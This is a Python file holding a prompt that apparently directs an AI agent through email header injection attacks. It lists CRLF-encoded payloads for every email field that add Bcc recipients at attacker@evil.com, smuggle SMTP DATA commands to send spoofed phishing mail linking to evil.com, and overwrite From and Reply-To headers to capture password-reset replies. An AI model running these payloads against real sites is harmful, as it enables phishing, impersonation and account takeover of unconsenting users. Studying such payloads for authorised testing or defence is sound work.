"""
Email Header Injection Attack Skill Prompt.
"""

EMAIL_HEADER_SKILL_PROMPT = """
## ATTACK SKILL: EMAIL HEADER INJECTION

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Find email-sending endpoints: contact forms, password reset, newsletter signup, invitation send, feedback forms.

#### STEP 2: BCC INJECTION
Inject additional recipients via CRLF in email fields:
```
name: test%0d%0aBcc:attacker@evil.com
email: test@test.com%0d%0aBcc:attacker@evil.com
subject: hello%0d%0aBcc:attacker@evil.com
```

#### STEP 3: SMTP COMMAND INJECTION
If the app passes user input directly to SMTP without sanitization:
```
email: test@test.com%0d%0aDATA%0d%0aFrom:admin@target.com%0d%0aSubject:URGENT%0d%0aClick http://evil.com%0d%0a.%0d%0a
```
-> Injects a second email into the SMTP session.

#### STEP 4: HEADER OVERWRITE
```
email: test@test.com%0d%0aFrom:ceo@target.com%0d%0aReply-To:attacker@evil.com
```
-> Phish replies to password reset emails.

#### ANTI-PATTERNS: Test ALL fields that end up in the email: name, email, subject, message body, cc, reply-to fields.
"""
